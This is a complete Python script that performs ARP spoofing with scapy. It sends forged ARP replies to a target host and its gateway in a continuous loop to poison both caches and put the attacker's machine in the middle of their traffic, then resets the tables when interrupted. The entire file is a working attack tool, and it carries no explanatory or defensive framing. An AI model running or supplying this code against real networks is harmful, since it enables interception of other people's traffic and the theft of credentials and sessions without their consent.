#!/usr/bin/env python
import scapy.all as scapy
import time
import argparse
def get_arguments():
    # Parser for options
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="ip", help="Write the target IP that you want to spoof")
    parser.add_argument("-s", "--spoof", dest="gt", help="Write gateway IP")
    arguments = parser.parse_args()
    if not arguments.ip:
        parser.error("[-] Please specify an target, use --help for more info. ")
    elif not arguments.gt:
        parser.error("[-] Please specify a gateway ip address for spoof, use --help for more info. ")
    return arguments

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose = False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac=get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst = target_ip, hwdst= target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose = False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count = 4, verbose = False)


def animated_loading(duration=5):
    symbols = ['⣾', '⣷', '⣯', '⣟', '⡿', '⢿', '⣻', '⣽']
    i = 0
    start_time = time.time()
    while time.time() - start_time < duration:
        i = (i + 1) % len(symbols)
        print('\r\033[K%s Resetting ARP tables Please wait...' % symbols[i], flush=True, end='')
        time.sleep(0.3)
    return "\n"

sent_packets_count = 0
arguments = get_arguments()

try:
    while True:
        spoof(arguments.ip, arguments.gt)
        spoof(arguments.gt, arguments.ip)
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    time.sleep(0.3)
    print(f"\n[-] Detected CTRL + C")
    time.sleep(1)
    print(animated_loading(4))
    restore(arguments.ip, arguments.gt)
    restore(arguments.gt, arguments.ip)
    print("[+] ARP tables have been successfully reset")

